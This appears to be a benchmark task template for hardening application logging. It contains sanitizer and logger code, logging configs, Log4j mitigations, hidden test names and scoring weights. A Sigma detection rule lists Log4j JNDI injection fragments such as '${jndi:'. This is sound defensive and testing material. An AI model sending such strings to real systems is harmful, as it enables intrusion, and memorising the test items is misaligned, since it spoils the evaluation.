      def redact_sensitive(cls, message: str) -> str:
          """
          Redact sensitive data from a log message.
          
          Args:
              message: Log message to redact
          
          Returns:
              Message with sensitive data redacted
          """
          for pattern, replacement in cls.SENSITIVE_PATTERNS:
              message = pattern.sub(replacement, message)
          return message
      
      @classmethod
      def sanitize_dict(cls, data: Dict[str, Any], 
                        sensitive_keys: Optional[List[str]] = None) -> Dict[str, str]:
          """
          Sanitize a dictionary for logging.
          
          Args:
              data: Dictionary to sanitize
              sensitive_keys: Keys to redact entirely
          
          Returns:
              Sanitized dictionary
          """
          sensitive_keys = sensitive_keys or [
              'password', 'passwd', 'secret', 'token', 'api_key',
              'apikey', 'authorization', 'auth', 'credential'
          ]
          
          result = {}
          for key, value in data.items():
              if any(s in key.lower() for s in sensitive_keys):
                  result[key] = '***REDACTED***'
              else:
                  result[key] = cls.sanitize(value)
          
          return result
  
  ## 1.2 Safe Logging Wrapper
  
  class SecureLogger:
      """
      Wrapper around standard logging with built-in sanitization.
      """
      
      def __init__(self, name: str, sanitizer: LogSanitizer = None):
          self.logger = logging.getLogger(name)
          self.sanitizer = sanitizer or LogSanitizer()
      
      def _format_message(self, message: str, *args, **kwargs) -> str:
          """Format message with sanitized arguments."""
          # Sanitize positional arguments
          safe_args = tuple(
              LogSanitizer.sanitize(arg) for arg in args
          )
          
          # Sanitize keyword arguments
          safe_kwargs = {
              k: LogSanitizer.sanitize(v) for k, v in kwargs.items()
          }
          
          # Format message
          try:
              formatted = message % safe_args if safe_args else message
              formatted = formatted.format(**safe_kwargs) if safe_kwargs else formatted
          except (TypeError, KeyError, IndexError):
              # Fallback: just sanitize the raw message
              formatted = LogSanitizer.sanitize(message)
          
          # Redact sensitive data
          return LogSanitizer.redact_sensitive(formatted)
      
      def info(self, message: str, *args, **kwargs):
          self.logger.info(self._format_message(message, *args, **kwargs))
      
      def warning(self, message: str, *args, **kwargs):
          self.logger.warning(self._format_message(message, *args, **kwargs))
      
      def error(self, message: str, *args, **kwargs):
          self.logger.error(self._format_message(message, *args, **kwargs))
      
      def debug(self, message: str, *args, **kwargs):
          self.logger.debug(self._format_message(message, *args, **kwargs))
      
      def critical(self, message: str, *args, **kwargs):
          self.logger.critical(self._format_message(message, *args, **kwargs))
  
  ## 1.3 Structured Logging with Sanitization
  
  import structlog
  
  def add_sanitization(logger, method_name, event_dict):
      """Structlog processor for sanitization."""
      for key, value in list(event_dict.items()):
          if key not in ('event', 'level', 'timestamp', 'logger'):
              event_dict[key] = LogSanitizer.sanitize(value)
      return event_dict
  
  def add_redaction(logger, method_name, event_dict):
      """Structlog processor for sensitive data redaction."""
      for key, value in list(event_dict.items()):
          if isinstance(value, str):
              event_dict[key] = LogSanitizer.redact_sensitive(value)
      return event_dict
  
  structlog.configure(
      processors=[
          structlog.stdlib.filter_by_level,
          structlog.stdlib.add_logger_name,
          structlog.stdlib.add_log_level,
          structlog.stdlib.PositionalArgumentsFormatter(),
          structlog.processors.TimeStamper(fmt="iso"),
          structlog.processors.StackInfoRenderer(),
          add_sanitization,  # Custom sanitization
          add_redaction,      # Custom redaction
          structlog.processors.format_exc_info,
          structlog.processors.UnicodeDecoder(),
          structlog.processors.JSONRenderer()
      ],
      context_class=dict,
      logger_factory=structlog.stdlib.LoggerFactory(),
      wrapper_class=structlog.stdlib.BoundLogger,
      cache_logger_on_first_use=True,
  )
  
  # ============================================================
  # PHASE 2: LOG CONFIGURATION
  # ============================================================
  
  ## 2.1 Python Logging Configuration
  
  # logging_config.yaml
  version: 1
  disable_existing_loggers: false
  
  filters:
    sensitive_data_filter:
      (): logging_filters.SensitiveDataFilter
    rate_limit_filter:
      (): logging_filters.RateLimitFilter
      rate: 100
      per_seconds: 60
  
  formatters:
    json:
      (): pythonjsonlogger.jsonlogger.JsonFormatter
      format: '%(asctime)s %(name)s %(levelname)s %(message)s'
      timestamp: true
  
  handlers:
    console:
      class: logging.StreamHandler
      level: INFO
      formatter: json
      filters: [sensitive_data_filter, rate_limit_filter]
      stream: ext://sys.stdout
    
    file:
      class: logging.handlers.RotatingFileHandler
      level: DEBUG
      formatter: json
      filters: [sensitive_data_filter]
      filename: /var/log/app/app.log
      maxBytes: 100000000  # 100MB
      backupCount: 10
      encoding: utf-8
    
    syslog:
      class: logging.handlers.SysLogHandler
      level: INFO
      formatter: json
      filters: [sensitive_data_filter, rate_limit_filter]
      address: ['localhost', 514]
      facility: local0
  
  loggers:
    app:
      level: DEBUG
      handlers: [console, file, syslog]
      propagate: false
    
    security:
      level: INFO
      handlers: [console, file, syslog]
      propagate: false
  
  root:
    level: WARNING
    handlers: [console]
  
  ## 2.2 Rate Limiting Filter
  
  from collections import deque
  import time
  import threading
  
  class RateLimitFilter(logging.Filter):
      """
      Rate limiting filter to prevent log flooding.
      """
      
      def __init__(self, rate: int = 100, per_seconds: int = 60):
          super().__init__()
          self.rate = rate
          self.per_seconds = per_seconds
          self.timestamps = deque(maxlen=rate)
          self.dropped_count = 0
          self.lock = threading.Lock()
          self.last_warning_time = 0
      
      def filter(self, record: logging.LogRecord) -> bool:
          now = time.time()
          
          with self.lock:
              # Remove old timestamps
              while self.timestamps and self.timestamps[0] < now - self.per_seconds:
                  self.timestamps.popleft()
              
              if len(self.timestamps) >= self.rate:
                  self.dropped_count += 1
                  
                  # Log warning periodically
                  if now - self.last_warning_time > 60:
                      self.last_warning_time = now
                      record.msg = f"[Rate limit: {self.dropped_count} messages dropped]"
                      record.args = ()
                      return True
                  
                  return False
              
              self.timestamps.append(now)
              return True
  
  # ============================================================
  # PHASE 3: LOG4J SPECIFIC MITIGATIONS
  # ============================================================
  
  ## 3.1 Log4j 2.x Configuration (if Java required)
  
  # log4j2.properties
  # status = error
  # name = PropertiesConfig
  # 
  # # CRITICAL: Disable message lookups
  # log4j2.formatMsgNoLookups = true
  # 
  # # Additional mitigations
  # log4j2.noFormatMsgLookup = true
  # log4j2.enableJndiLookup = false
  # log4j2.enableJndiJms = false
  # log4j2.enableJndiContextSelector = false
  
  ## 3.2 System Properties (JVM)
  
  # -Dlog4j2.formatMsgNoLookups=true
  # -Dlog4j2.noFormatMsgLookup=true
  # -Dcom.sun.jndi.ldap.object.trustURLCodebase=false
  # -Dcom.sun.jndi.rmi.object.trustURLCodebase=false
  # -Dcom.sun.jndi.cosnaming.object.trustURLCodebase=false
  
  ## 3.3 Remove JndiLookup class
  
  # zip -q -d log4j-core-*.jar org/apache/logging/log4j/core/lookup/JndiLookup.class
  
  # ============================================================
  # PHASE 4: MONITORING AND DETECTION
  # ============================================================
  
  ## 4.1 Detection Rules (Sigma format)
  
  # title: Log4j JNDI Injection Attempt
  # status: stable
  # description: Detects Log4j JNDI injection attempts
  # references:
  #   - https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2021-44228
  # author: Security Team
  # date: 2021/12/10
  # logsource:
  #   category: webserver
  # detection:
  #   selection:
  #     - cs-uri-query|contains:
  #       - '${jndi:'
  #       - '${${lower:j}'
  #       - '${${::-j}'
  #     - cs-user-agent|contains:
  #       - '${jndi:'
  #     - cs-referer|contains:
  #       - '${jndi:'
  #   condition: selection
  # falsepositives:
  #   - Vulnerability scanners
  # level: critical
  # tags:
  #   - attack.initial_access
  #   - attack.t1190
  #   - cve.2021.44228
  
  ## 4.2 Prometheus Metrics
  
  # Custom metrics for log monitoring
  log_injection_attempts_total = Counter(
      'log_injection_attempts_total',
      'Total log injection attempts detected',
      ['type', 'source']
  )
  
  log_sensitive_data_redactions_total = Counter(
      'log_sensitive_data_redactions_total',
      'Total sensitive data redactions performed',
      ['data_type']
  )
  
  log_rate_limit_drops_total = Counter(
      'log_rate_limit_drops_total',
      'Total log messages dropped due to rate limiting',
      ['logger']
  )
  
  ## 4.3 Alert Rules
  
  groups:
  - name: log-security
    rules:
    - alert: LogInjectionAttemptDetected
      expr: rate(log_injection_attempts_total[5m]) > 0
      for: 1m
      labels:
        severity: critical
      annotations:
        summary: "Log injection attempt detected"
        description: "{{ $labels.type }} injection attempt from {{ $labels.source }}"
    
    - alert: HighSensitiveDataRedactionRate
      expr: rate(log_sensitive_data_redactions_total[5m]) > 100
      for: 5m
      labels:
        severity: warning
      annotations:
        summary: "High rate of sensitive data redaction"
        description: "May indicate application logging sensitive data"
    
    - alert: LogRateLimitActive
      expr: rate(log_rate_limit_drops_total[5m]) > 100
      for: 5m
      labels:
        severity: warning
      annotations:
        summary: "Log rate limiting active"
        description: "Logger {{ $labels.logger }} is being rate limited"

# Test cases for validation
fail_to_pass:
  - "test_no_log_injection"
  - "test_no_jndi_lookup"
  - "test_sensitive_data_redacted"
  - "test_path_traversal_blocked"
  - "test_rate_limiting_works"
  - "test_log_integrity"
  - "test_secure_transport"

pass_to_pass:
  - "test_basic_logging"
  - "test_structured_logs"
  - "test_log_levels_work"
  - "test_correlation_ids"

# Variables for task generation
variables:
  - name: scenario_type
    type: string
    options: 
      - "web application"
      - "microservices"
      - "API gateway"
      - "data pipeline"
      - "financial system"
      - "healthcare application"
      - "e-commerce platform"
  
  - name: cloud_provider
    type: string
    options: ["AWS", "GCP", "Azure", "on-premise", "hybrid"]
  
  - name: app_framework
    type: string
    options: ["Spring Boot", "Django", "Express.js", "FastAPI", "Rails", "ASP.NET"]
  
  - name: log_framework
    type: string
    options: ["Log4j", "Logback", "Python logging", "Winston", "Serilog", "Bunyan"]
  
  - name: log_version
    type: string
    generator: version_string
  
  - name: log_aggregator
    type: string
    options: ["Elasticsearch", "Splunk", "Datadog", "CloudWatch", "Stackdriver", "Azure Monitor"]
  
  - name: path
    type: path
    generator: random_path
  
  - name: log_volume
    type: int
    min: 1
    max: 10000
  
  - name: retention_days
    type: int
    min: 30
    max: 2555
  
  - name: sensitive_incidents
    type: int
    min: 0
    max: 100
  
  - name: injection_vectors
    type: int
    min: 1
    max: 20
  
  - name: compliance_findings
    type: int
    min: 0
    max: 50
  
  - name: compliance_frameworks
    type: list
    options: ["PCI-DSS", "HIPAA", "SOX", "GDPR", "SOC2", "FedRAMP"]
  
  - name: task_steps
    type: template
    value: |
      1. Audit logging code for injection vulnerabilities
      2. Implement input sanitization library
      3. Configure sensitive data redaction
      4. Disable dangerous logging features
      5. Implement rate limiting
      6. Configure secure log transport
      7. Set up log integrity verification
      8. Create detection rules for attacks
      9. Configure alerting and monitoring
      10. Document compliance evidence

# Anti-hardcoding measures
anti_hardcoding:
  canary_tokens: true
  randomize_paths: true
  dynamic_content: true
  log_vulnerabilities:
    - newline_injection
    - jndi_lookup
    - sensitive_data
    - path_traversal
    - encoding_bypass
    - rate_limit_bypass

# Anti-patterns for LLM failure modes
anti_patterns:
  llm_failure_modes:
    - "Applying generic DevOps patterns without cloud-specific considerations"
    - "Missing container runtime security boundaries"
    - "Ignoring network policy interactions in Kubernetes"
    - "Not considering eventual consistency in distributed config management"
    - "Missing hidden resource contention in shared infrastructure"
    - "Overlooking DNS TTL and caching layer interactions"
    - "Assuming CI/CD tools handle secrets securely by default"
    - "Missing supply chain attack vectors in dependency management"
    - "Ignoring infrastructure drift detection gaps"
    - "Assuming HTML encoding prevents all log injection attacks"
    - "Not understanding Log4j nested lookup bypass techniques"
    - "Recommending log sanitization without considering encoding bypass"
    - "Ignoring SIEM query injection risks in log-based detection"
    - "Assuming structured logging prevents all injection vectors"
    - "Not understanding the difference between log masking and redaction"
    - "Missing ANSI escape code injection for terminal-based log viewers"
    - "Recommending rate limiting without considering important event loss"
    - "Ignoring log aggregator parser vulnerabilities"
    - "Assuming log encryption prevents sensitive data exposure"
    - "Not understanding container log driver security implications"
    - "Missing the impact of log buffering on forensic completeness"
    - "Recommending centralized logging without considering single point of failure"
    - "Ignoring timestamp manipulation for SIEM correlation evasion"
    - "Assuming application-level logging controls prevent framework logging exposure"
    - "Not understanding the forensic implications of log rotation during incidents"
    - "Missing the difference between audit logs and application logs for compliance"
    - "Recommending log integrity without understanding hash chain requirements"
    - "Ignoring the performance impact of synchronous logging with integrity checks"

# Evaluation metrics
evaluation:
  security_score:
    weight: 0.40
    metrics:
      - "No injection vulnerabilities"
      - "All sensitive data redacted"
      - "Secure transport configured"
      - "Log integrity verified"
  
  compliance_score:
    weight: 0.35
    metrics:
      - "Retention requirements met"
      - "Audit trail complete"
      - "Documentation provided"
  
  operational_score:
    weight: 0.25
    metrics:
      - "Logging functional"
      - "No performance impact"
      - "Alerting configured"
